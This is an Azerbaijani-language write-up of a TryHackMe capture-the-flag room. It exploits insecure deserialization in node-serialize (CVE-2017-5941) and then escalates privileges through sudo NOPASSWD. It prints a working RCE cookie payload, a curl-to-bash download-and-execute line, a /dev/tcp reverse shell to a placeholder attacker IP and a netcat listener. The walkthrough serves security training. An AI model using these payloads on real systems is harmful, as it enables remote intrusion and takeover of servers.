# TryHackMe — Jax sucks alot (Jason) Writeup

**Platforma:** TryHackMe  
**Room:** [Jax sucks alot](https://tryhackme.com/room/jason)  
**Çətinlik:** Asan  
**Mövzu:** Node.js Insecure Deserialization RCE + Privilege Escalation  

---

## Ümumi Baxış

Bu room Node.js ilə yazılmış zəif bir veb tətbiqini hədəf alır. Əsas hücum vektoru **CVE-2017-5941** — `node-serialize` kitabxanasındakı təhlükəsiz olmayan deserialization zəifliyidir. Bu zəiflikdən istifadə edərək uzaqdan kod icra etmək (RCE) mümkündür.

---

## 1. Kəşfiyyat (Reconnaissance)

### Nmap Skan

```bash
nmap -sC -sV -Pn -T4 <HEDEF_IP>
```

**Nəticə:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Node.js
```

Açıq portlar:
- **Port 22** — SSH
- **Port 80** — HTTP (Node.js veb server)

---

## 2. Veb Tətbiqinin Araşdırılması

Brauzerdə `http://<HEDEF_IP>` ünvanına getdikdə **"Horror LLC"** adlı sadə bir səhifə görünür. Səhifədə vacib bir ipucu var:

> **"Built with NodeJS"**

Bu, serverin Node.js ilə işlədiyini bildirir və hücum vektorumuzu müəyyən edir.

Səhifədə bir **email abunə formu** var.

---

## 3. Burp Suite ilə Trafik Analizi

Forma `test@test.com` email-i daxil edib göndərdikdə Burp Suite aşağıdakı cavabı tutur:

**Request:**
```
POST /?email=test@test.com HTTP/1.1
Host: <HEDEF_IP>
```

**Response:**
```
Set-Cookie: session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==; HttpOnly
```

Cookie-ni Base64 decode edirik:

```bash
echo "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==" | base64 -d
```

**Nəticə:**
```json
{"email":"test@test.com"}
```

### Nə anlayırıq?

Server datanı serialize edib cookie kimi saxlayır. Bizim göndərdiyimiz cookie-ni isə geri deserialize edir. Əgər server `node-serialize` kitabxanasının `unserialize()` funksiyasını işlədirsə — bu **CVE-2017-5941** zəifliyidir.

---

## 4. Exploit Hazırlanması

### node-serialize zəifliyi nədir?

`node-serialize` kitabxanası JSON datasını deserialize edərkən `_$$ND_FUNC$$_` açar sözünü görəndə həmin dəyəri **JavaScript funksiyası kimi icra edir**. Bu, RCE-yə (Remote Code Execution) imkan verir.

### Shell faylı hazırla

Kali maşınımızda reverse shell skripti yaradırıq:

```bash
echo "sh -i >& /dev/tcp/<KALI_IP>/9001 0>&1" > shell.sh
```

### Python HTTP Server aç

Hədəf serverin shell faylını bizdən çəkə bilməsi üçün:

```bash
python3 -m http.server 9002
```

### Netcat Listener aç

```bash
nc -lvnp 9001
```

---

## 5. Hücumun İcrası

Burp Suite ilə saytın email formasını intercept edirik. Email sahəsinə aşağıdakı payload-ı yazırıq:

```
_$$ND_FUNC$$_function(){require('child_process').exec('curl http://<KALI_IP>:9002/shell.sh|bash')}()
```

**Nə baş verir?**

1. Server bu payload-ı email kimi qəbul edir
2. `node-serialize` ilə deserialize edərkən `_$$ND_FUNC$$_` görür
3. İçindəki kodu **icra edir**
4. Kod bizim Kali-dən `shell.sh` faylını çəkib bash ilə işlədir
5. Reverse shell bağlantısı gəlir!

**Netcat terminalında:**
```
listening on [any] 9001 ...
connect to [<KALI_IP>] from <HEDEF_IP>
$ whoami
ubuntu
```

İçəridəyik! 🎉

---

## 6. Bayraqların Tapılması

### User Flag

```bash
find / -name "user.txt" 2>/dev/null
cat /home/dylan/user.txt
```

### Privilege Escalation

```bash
sudo -l
```

**Nəticə:**
```
User ubuntu may run the following commands:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

`NOPASSWD: ALL` — ubuntu istifadəçisi heç bir şifrə daxil etmədən root kimi istənilən əmri icra edə bilər.

### Root Flag

```bash
sudo cat /root/root.txt
```

---

## 7. Nəticə

| Addım | Texnika |
|-------|---------|
| Kəşfiyyat | Nmap port skanı |
| Zəiflik tapma | Cookie Base64 decode → Insecure Deserialization |
| Exploit | CVE-2017-5941 (node-serialize RCE) |
| Shell | Reverse Shell via curl + bash |
| Privesc | sudo NOPASSWD:ALL |

### Öyrəndiklərimiz

- **Node.js Insecure Deserialization (CVE-2017-5941)** — `node-serialize` kitabxanasının `unserialize()` funksiyası gələn datadakı funksiyaları icra edir
- **Cookie analizi** — Base64 encode edilmiş cookie-lər həmişə decode edilməlidir
- **Sudo yanlış konfiqurasiyası** — `NOPASSWD: ALL` çox təhlükəlidir

---

*Writeup: TryHackMe — Jax sucks alot (Jason) | Azərbaycanca*
